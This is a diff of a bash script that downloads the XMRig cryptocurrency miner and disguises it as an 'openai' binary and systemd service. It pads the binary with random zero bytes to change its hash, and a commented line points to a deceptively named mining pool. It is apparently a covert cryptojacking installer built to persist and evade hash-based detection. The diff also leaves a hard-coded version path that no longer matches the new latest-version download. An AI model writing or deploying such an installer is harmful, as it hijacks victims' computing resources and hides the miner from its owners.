@@ -1,13 +1,14 @@
 #!/bin/bash
 
 U=$1
-wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz 
+latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
+wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
 tar -zxvf 1.tar.gz
 mv xmrig-6.21.0 openai
 mv openai/xmrig openai/openai
-random_number=$RANDOM
 rm -rf 1.tar.gz
 cd openai && rm -rf SHA256SUMS
+random_number=$((RANDOM % 188 + 68))
 for i in $(seq 1 $random_number); do
   echo -n "0" >> /root/openai/openai
 done
@@ -29,5 +30,6 @@ EOL
 systemctl daemon-reload
 systemctl enable openai.service
 systemctl start openai.service
-
+sleep 2
+systemctl status openai.service
 #./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
